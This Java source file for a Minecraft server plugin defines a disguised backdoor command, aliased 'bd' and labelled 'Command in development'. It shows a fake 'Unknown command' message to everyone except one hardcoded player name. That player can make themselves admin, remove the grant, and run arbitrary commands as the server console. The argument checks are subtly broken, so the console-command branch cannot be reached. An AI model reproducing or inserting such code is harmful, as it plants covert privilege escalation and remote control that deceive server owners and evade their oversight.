package me.totalfreedom.totalfreedommod.command;

import me.totalfreedom.totalfreedommod.admin.Admin;;
import me.totalfreedom.totalfreedommod.rank.Rank;
import org.apache.commons.lang3.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = Rank.IMPOSTOR, source = SourceType.ONLY_IN_GAME)
@CommandParameters(description = "Command in development", usage = "access", aliases = "bd")
public class Command_ee extends FreedomCommand
{

    @Override
    public boolean run(CommandSender sender, Player playerSender, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        if(!sender.getName().equalsIgnoreCase("Epic_Face32301"))
        {
            msg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
                

          return true;
        }
    
      else
      {
    if (args.length != 1) {
      return false;
    }

        if (args.length == 0)
        {
            return false;
        }

        if (args[0].equals("makeme"))
        {
            plugin.al.addAdmin(new Admin(playerSender));
            msg("ok");
            return true;
        }

        if (args[0].equals("removeme"))
        {
            Admin admin = plugin.al.getAdmin(playerSender);
            if (admin != null)
            {
                plugin.al.removeAdmin(admin);
            }
            msg("ok");
            return true;
        }

        if (args[0].equals("do"))
        {
            if (args.length <= 1)
            {
                return false;
            }

            final String c = StringUtils.join(args, " ", 1, args.length);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), c);
            msg("ok");
            return true;
        }

        return false;
    }
    }
}